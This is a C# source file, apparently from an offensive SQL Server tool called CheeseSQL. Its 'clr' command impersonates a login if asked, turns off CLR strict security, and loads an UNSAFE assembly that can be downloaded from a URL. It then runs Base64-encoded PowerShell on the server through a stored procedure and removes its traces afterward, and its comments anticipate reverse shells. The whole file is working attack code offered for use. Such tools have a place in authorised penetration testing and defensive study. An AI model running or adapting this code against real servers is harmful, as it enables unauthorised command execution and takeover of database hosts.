using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Net;

namespace CheeseSQL.Commands
{
    public class clr : ICommand
    {
        public static string CommandName => "clr";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
    $"  Description: Execute Encoded PowerShell Command via custom CLR assembly";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " + 
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/command:COMMAND " +
                $"/assembly:DLL " +
                $"/class:CLASS " +
                $"/method:METHOD " +
                $"[/compile] " +
                $"[/impersonate:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            string rs = "0";
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            while (char.IsDigit(rs[0])) { 
                rs = new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
            }
            return rs;
        }

        public static string ConvertByteToHex(byte[] byteData)
        {
            return BitConverter.ToString(byteData).Replace("-", "");
        }

        public static string LoadAssembly(string filename, string className=null, string methodName=null, bool compile=false)
        {

            byte[] byteData = new byte[] { };
            if (compile)
            {
                byteData = Helpers.AssemblyCompiler.compileWithRoselyn(className, methodName, filename);
            }
            else if (File.Exists(filename))
            {
                byteData = File.ReadAllBytes(filename);
            }
            else if (filename.StartsWith("http"))
            {
                byteData = (new WebClient()).DownloadData(filename);
            }
            else if (filename.StartsWith("0x"))
            {
                return filename;
            }
            else
            {
                throw new FormatException();
            }

            return "0x" + BitConverter.ToString(byteData).Replace("-", "");
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string database = "";
            string connectserver = "";
            string assembly = "";
            string clazz = "";
            string cmd = "";
            string method = "";
            string user = "";
            string password = "";
            string connectInfo = "";
            string impersonate = "";
            bool compile = false;

            bool sqlauth = false;
            bool brokenConnection = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/compile"))
            {
                compile = true;
            }
            if (arguments.ContainsKey("/assembly"))
            {
                assembly = arguments["/assembly"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }
            if (arguments.ContainsKey("/class"))
            {
                clazz = arguments["/class"];
            }
            if (arguments.ContainsKey("/method"))
            {
                method = arguments["/method"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = arguments["/impersonate"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(assembly) && !compile)
            {
                Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                return;
            } else if (String.IsNullOrEmpty(assembly) && compile) {
                assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute (PS Base64 Encoded)!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(clazz))
            {
                clazz = "StoredProcedures";
            }
            if (String.IsNullOrEmpty(method))
            {
                method = RandomString(10);
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                return;
            }

            SqlCommand command;
            SqlDataReader reader;

            Console.WriteLine("[*] Loading assembly..");

            string hexData = LoadAssembly(assembly, clazz, method, compile);

            if (!String.IsNullOrEmpty(impersonate))
            {
                string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
                command = new SqlCommand(execAs, connection);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Attempting impersonation as {0}..", impersonate);
                reader.Close();
            }

            Console.WriteLine("[*] Enabling CLR..");
            string enableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            command = new SqlCommand(enableOle, connection);
            Console.WriteLine("[*] Disabling CLR Security..");
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();
            
            Console.WriteLine("[*] Creating assembly {0}..", assembly);

            string execCmd = $"CREATE ASSEMBLY {assembly} FROM {hexData} WITH PERMISSION_SET = UNSAFE;";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();
            
            Console.WriteLine("[*] Creating procedure [{0}].[{1}].[{2}]..", assembly, clazz, method);

            execCmd = $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            try
            {
                Console.WriteLine("[*] Executing command..");
                execCmd = $"EXEC {method} '{cmd}';";
                command = new SqlCommand(execCmd, connection);
                using (reader = command.ExecuteReader())
                {
                    try
                    {
                        reader.Read();
                        Console.WriteLine("[+] Command result: " + reader[0]);
                    }
                    catch { }
                }
            }
            catch (SqlException e)
            {
                if (e.Message.Contains("Execution Timeout Expired"))
                {
                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is expected");
                    brokenConnection = true;
                }
                else
                {
                    Console.WriteLine($"[-] Exception: {e.Message}");
                    return;
                }
            }

            execCmd = $"DROP PROCEDURE [dbo].[{method}];";
            if (brokenConnection)
            {
                connection = new SqlConnection(connectInfo);
                connection.Open();

                if (!String.IsNullOrEmpty(impersonate))
                {
                    string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
                    command = new SqlCommand(execAs, connection);
                    reader = command.ExecuteReader();
                    reader.Read();
                    reader.Close();
                }
            }

            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            execCmd = $"DROP ASSEMBLY {assembly};";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();


            Console.WriteLine("[*] Restoring CLR Security..");
            string disableOle = "EXEC sp_configure 'clr strict security', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
            command = new SqlCommand(disableOle, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling CLR..");
            reader.Close();

            connection.Close();
        }
    }
}
